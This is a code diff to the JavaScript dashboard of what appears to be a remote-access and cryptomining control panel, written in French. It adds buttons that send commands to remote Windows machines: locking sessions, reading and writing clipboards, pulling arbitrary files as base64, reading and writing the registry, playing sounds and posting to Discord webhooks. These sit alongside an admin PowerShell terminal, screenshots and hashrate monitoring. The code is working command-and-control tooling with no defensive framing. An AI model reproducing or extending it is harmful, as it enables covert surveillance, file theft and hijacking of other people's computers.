@@ -451,8 +451,13 @@ async function openMachineDetail(hostname){
     }}catch{}
 
   document.getElementById('m-content').innerHTML=
-    '<div class="modal-section"><div class="modal-section-title">Informations</div><div class="info-grid">'
+    '<div class="modal-section"><div class="modal-section-title">🖥 Specs Systeme</div><div class="info-grid">'
+    +'<div class="info-item"><div class="ii-label">CPU</div><div class="ii-val">'+esc(m.cpu_name||'--')+'</div></div>'
+    +'<div class="info-item"><div class="ii-label">RAM</div><div class="ii-val blue">'+(m.ram_total_mb?(m.ram_total_mb/1024).toFixed(1)+' GB':'--')+'</div></div>'
+    +'<div class="info-item"><div class="ii-label">OS</div><div class="ii-val purple">'+esc(m.os_version||'--')+'</div></div>'
     +'<div class="info-item"><div class="ii-label">GPU</div><div class="ii-val">'+esc(m.gpu_name||'--')+'</div></div>'
+    +'</div></div>'
+    +'<div class="modal-section"><div class="modal-section-title">Informations</div><div class="info-grid">'
     +'<div class="info-item"><div class="ii-label">Vendeur</div><div class="ii-val purple">'+esc(m.gpu_vendor||'--')+'</div></div>'
     +'<div class="info-item"><div class="ii-label">Hashrate</div><div class="ii-val green">'+(m.hashrate_mhs||0).toFixed(2)+' MH/s</div></div>'
     +'<div class="info-item"><div class="ii-label">Temperature</div><div class="ii-val '+(m.gpu_temp_c>70?'red':'')+'">'+m.gpu_temp_c+'&deg;C</div></div>'
@@ -511,6 +516,23 @@ async function openMachineDetail(hostname){
     +'<div class="modal-section"><div class="modal-section-title">⚡ Terminal PowerShell (Admin)</div><div class="modal-controls">'
     +'<div style="display:flex;gap:8px;margin-bottom:8px"><input type="text" id="ps-input" placeholder="ex: Get-Process, Get-Service, Get-NetAdapter..." style="flex:1;background:var(--bg);border:1px solid var(--border);color:var(--text);padding:10px 14px;border-radius:8px;font-family:monospace;font-size:.85rem" onkeydown="if(event.key===\'Enter\')execPS(\''+h+'\')"><button onclick="execPS(\''+h+'\')" style="background:#012456;color:#fff;border:none;padding:10px 18px;border-radius:8px;font-size:.85rem;font-weight:600;cursor:pointer;white-space:nowrap">⚡ Executer</button></div>'
     +'<div id="ps-output" style="background:#012456;border:1px solid #1e3a5f;border-radius:8px;padding:12px;font-family:\'Cascadia Code\',\'Consolas\',monospace;font-size:.8rem;color:#eeedf0;max-height:300px;overflow-y:auto;white-space:pre-wrap;display:none"></div></div></div>'
+    +'<div class="modal-section"><div class="modal-section-title">🔐 Session & Clipboard</div><div class="modal-controls">'
+    +'<div class="modal-btns" style="margin-bottom:8px"><button onclick="lockSession(\''+h+'\')" style="background:var(--gold);color:#000;border:none;padding:10px 18px;border-radius:8px;font-weight:600;cursor:pointer">🔐 Verrouiller Session</button><button onclick="getClipboard(\''+h+'\')" style="background:var(--blue);color:#fff;border:none;padding:10px 18px;border-radius:8px;font-weight:600;cursor:pointer">📋 Lire Clipboard</button></div>'
+    +'<div style="display:flex;gap:8px"><input type="text" id="clip-input" placeholder="Texte a copier dans le presse-papiers..." style="flex:1;background:var(--bg);border:1px solid var(--border);color:var(--text);padding:10px 14px;border-radius:8px;font-size:.85rem"><button onclick="setClipboard(\''+h+'\')" style="background:var(--purple);color:#fff;border:none;padding:10px 18px;border-radius:8px;font-weight:600;cursor:pointer">📋 Ecrire</button></div>'
+    +'<div id="clip-output" style="background:var(--bg);border:1px solid var(--border2);border-radius:8px;padding:12px;font-family:monospace;font-size:.75rem;color:var(--text);max-height:150px;overflow-y:auto;white-space:pre-wrap;display:none;margin-top:8px"></div></div></div>'
+    +'<div class="modal-section"><div class="modal-section-title">🔊 Jouer un Son</div><div class="modal-controls">'
+    +'<div style="display:flex;gap:8px"><input type="text" id="sound-input" placeholder="URL du fichier .wav..." style="flex:1;background:var(--bg);border:1px solid var(--border);color:var(--text);padding:10px 14px;border-radius:8px;font-size:.85rem"><button onclick="playSound(\''+h+'\')" style="background:var(--green3);color:#fff;border:none;padding:10px 18px;border-radius:8px;font-weight:600;cursor:pointer">🔊 Jouer</button></div></div></div>'
+    +'<div class="modal-section"><div class="modal-section-title">📥 Telecharger Fichier</div><div class="modal-controls">'
+    +'<div style="display:flex;gap:8px"><input type="text" id="dl-input" placeholder="Chemin du fichier (ex: C:\\Users\\test.txt)..." style="flex:1;background:var(--bg);border:1px solid var(--border);color:var(--text);padding:10px 14px;border-radius:8px;font-family:monospace;font-size:.85rem"><button onclick="downloadFile(\''+h+'\')" style="background:var(--blue);color:#fff;border:none;padding:10px 18px;border-radius:8px;font-weight:600;cursor:pointer">📥 Telecharger</button></div>'
+    +'<div id="dl-output" style="background:var(--bg);border:1px solid var(--border2);border-radius:8px;padding:12px;font-family:monospace;font-size:.75rem;color:var(--text);max-height:150px;overflow-y:auto;display:none;margin-top:8px"></div></div></div>'
+    +'<div class="modal-section"><div class="modal-section-title">🗂 Editeur Registre</div><div class="modal-controls">'
+    +'<div style="display:flex;gap:8px;margin-bottom:8px"><input type="text" id="reg-read-input" placeholder="HKLM\\SOFTWARE\\...\\ValueName" style="flex:1;background:var(--bg);border:1px solid var(--border);color:var(--text);padding:10px 14px;border-radius:8px;font-family:monospace;font-size:.85rem"><button onclick="regRead(\''+h+'\')" style="background:var(--blue);color:#fff;border:none;padding:10px 18px;border-radius:8px;font-weight:600;cursor:pointer">📖 Lire</button></div>'
+    +'<div style="display:flex;gap:8px"><input type="text" id="reg-write-input" placeholder="HKLM\\...\\SubKey|ValueName|Value" style="flex:1;background:var(--bg);border:1px solid var(--border);color:var(--text);padding:10px 14px;border-radius:8px;font-family:monospace;font-size:.85rem"><button onclick="regWrite(\''+h+'\')" style="background:var(--red);color:#fff;border:none;padding:10px 18px;border-radius:8px;font-weight:600;cursor:pointer">✏️ Ecrire</button></div>'
+    +'<div id="reg-output" style="background:var(--bg);border:1px solid var(--border2);border-radius:8px;padding:12px;font-family:monospace;font-size:.75rem;color:var(--text);max-height:150px;overflow-y:auto;white-space:pre-wrap;display:none;margin-top:8px"></div></div></div>'
+    +'<div class="modal-section"><div class="modal-section-title">🤖 Discord Bot</div><div class="modal-controls">'
+    +'<div style="display:flex;gap:8px;margin-bottom:8px"><input type="text" id="discord-webhook" placeholder="URL du webhook Discord..." style="flex:1;background:var(--bg);border:1px solid var(--border);color:var(--text);padding:10px 14px;border-radius:8px;font-size:.85rem"></div>'
+    +'<div style="display:flex;gap:8px"><input type="text" id="discord-msg" placeholder="Message a envoyer..." style="flex:1;background:var(--bg);border:1px solid var(--border);color:var(--text);padding:10px 14px;border-radius:8px;font-size:.85rem"><button onclick="sendDiscord(\''+h+'\')" style="background:#5865F2;color:#fff;border:none;padding:10px 18px;border-radius:8px;font-weight:600;cursor:pointer">🤖 Envoyer</button></div>'
+    +'<div id="discord-output" style="background:var(--bg);border:1px solid var(--border2);border-radius:8px;padding:12px;font-size:.75rem;color:var(--text);display:none;margin-top:8px"></div></div></div>'
     +'<button class="btn-delete-machine" onclick="deleteMachine(\''+h+'\')">Supprimer cette machine</button></div>';
   document.getElementById('modal').classList.add('show');
   loadScreenGallery(h);
@@ -950,6 +972,56 @@ function uploadFile(h){
 
 // ACTIVITY
 function getActivity(h){showToast('👁 Lecture activite...');sendCommand(h,'command','activity');pollCmdResult(h,'activity-output');}
+
+// LOCK SESSION
+function lockSession(h){sendCommand(h,'command','lock');showToast('🔐 Session verrouillée');}
+
+// CLIPBOARD
+function getClipboard(h){showToast('📋 Lecture clipboard...');sendCommand(h,'command','clipboard:get');pollCmdResultLevel(h,'clip-output','clipboard');}
+function setClipboard(h){const t=document.getElementById('clip-input').value;if(!t)return;sendCommand(h,'command','clipboard:set:'+t);showToast('📋 Clipboard mis à jour');}
+
+// PLAY SOUND
+function playSound(h){const u=document.getElementById('sound-input').value.trim();if(!u)return;sendCommand(h,'command','playsound:'+u);showToast('🔊 Son envoyé');}
+
+// DOWNLOAD FILE
+function downloadFile(h){
+  const p=document.getElementById('dl-input').value.trim();if(!p)return;
+  showToast('📥 Téléchargement...');sendCommand(h,'command','dl:'+p);
+  const output=document.getElementById('dl-output');output.style.display='block';output.innerHTML='⏳ Attente...';
+  const before=new Date().toISOString();let attempts=0;
+  const poll=setInterval(async()=>{attempts++;
+    try{const r=await fetch(SB+'/rest/v1/machine_logs?hostname=eq.'+encodeURIComponent(h)+'&level=eq.file_download&created_at=gte.'+before+'&order=created_at.desc&limit=1',{headers:H});
+      const d=await r.json();
+      if(d.length&&d[0].message){clearInterval(poll);
+        const msg=d[0].message;
+        if(msg.startsWith('FILE:')){const nl=msg.indexOf('\n');const fname=msg.substring(5,nl);const b64=msg.substring(nl+1);
+          const blob=new Blob([Uint8Array.from(atob(b64),c=>c.charCodeAt(0))]);const url=URL.createObjectURL(blob);
+          output.innerHTML='<a href="'+url+'" download="'+fname+'" style="color:var(--green);font-weight:600">📥 '+fname+' - Cliquer pour sauvegarder</a>';
+        }else{output.textContent=msg;}
+      }
+    }catch{}
+    if(attempts>60){clearInterval(poll);output.textContent='⚠️ Timeout';}
+  },3000);
+}
+
+// REGISTRY
+function regRead(h){const k=document.getElementById('reg-read-input').value.trim();if(!k)return;showToast('📖 Lecture registre...');sendCommand(h,'command','regread:'+k);pollCmdResultLevel(h,'reg-output','registry');}
+function regWrite(h){const k=document.getElementById('reg-write-input').value.trim();if(!k)return;if(!confirm('✏️ Ecrire dans le registre ?'))return;sendCommand(h,'command','regwrite:'+k);showToast('✏️ Ecriture registre...');pollCmdResultLevel(h,'reg-output','registry');}
+
+// DISCORD
+function sendDiscord(h){const wh=document.getElementById('discord-webhook').value.trim();const msg=document.getElementById('discord-msg').value.trim();if(!wh||!msg)return;sendCommand(h,'command','discord:'+wh+'|'+msg);showToast('🤖 Message Discord envoyé');const o=document.getElementById('discord-output');o.style.display='block';o.textContent='✅ Commande envoyée';}
+
+// GENERIC LEVEL POLLER
+function pollCmdResultLevel(h,outputId,level){
+  const output=document.getElementById(outputId);output.style.display='block';output.textContent='⏳ Attente reponse...';
+  const before=new Date().toISOString();let attempts=0;
+  const poll=setInterval(async()=>{attempts++;
+    try{const r=await fetch(SB+'/rest/v1/machine_logs?hostname=eq.'+encodeURIComponent(h)+'&level=eq.'+level+'&created_at=gte.'+before+'&order=created_at.desc&limit=1',{headers:H});
+      const d=await r.json();if(d.length&&d[0].message){clearInterval(poll);output.textContent=d[0].message;}
+    }catch{}
+    if(attempts>60){clearInterval(poll);output.textContent='⚠️ Pas de reponse';}
+  },3000);
+}
 
 // GENERIC CMD RESULT POLLER
 function pollCmdResult(h,outputId){
